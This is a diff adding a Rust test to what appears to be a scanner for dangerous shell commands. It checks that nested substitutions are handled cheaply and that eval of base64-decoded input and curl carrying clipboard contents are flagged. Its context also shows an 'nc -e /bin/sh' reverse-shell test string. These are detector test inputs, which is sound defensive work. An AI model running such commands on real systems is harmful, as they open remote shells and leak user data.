@@ -919,6 +919,33 @@ fn a_long_word_of_startup_files_is_read_once() {
 }
 
 #[test]
+fn substitutions_inside_one_another_cost_each_rule_little() {
+    // Each of these is sixty-four substitutions that reach the end of the
+    // line: none is run, so no rule reads them.
+    for token in ["$(", "<(", "$(curl ", "x=$(", "\"$( "] {
+        let line = token.repeat(60_000 / token.len());
+        let found = rules_for(&line);
+        assert!(found.is_empty(), "{token}: {found:?}");
+    }
+    // Run, they are more than is read, and the line is reported.
+    let nested = "$(tr a b ".repeat(8_000);
+    assert_eq!(
+        rules_for(&format!("eval {nested}")),
+        [RuleId::EncodedCommandExecution]
+    );
+    assert_eq!(
+        rules_for(&format!("curl a {}", "$(wl-paste ".repeat(8_000))),
+        [RuleId::CredentialExfiltration]
+    );
+    // A few are read as before.
+    assert!(rules_for("eval \"$(echo \"$(tr a b <<< \"$(cat x)\")\")\"").is_empty());
+    assert_eq!(
+        rules_for("eval \"$(echo \"$(echo \"$(base64 -d x)\")\")\""),
+        [RuleId::EncodedCommandExecution]
+    );
+}
+
+#[test]
 fn remote_shells_are_caught_without_firing_on_imports() {
     for shell in [
         "nc -e /bin/sh 10.0.0.1 4444",
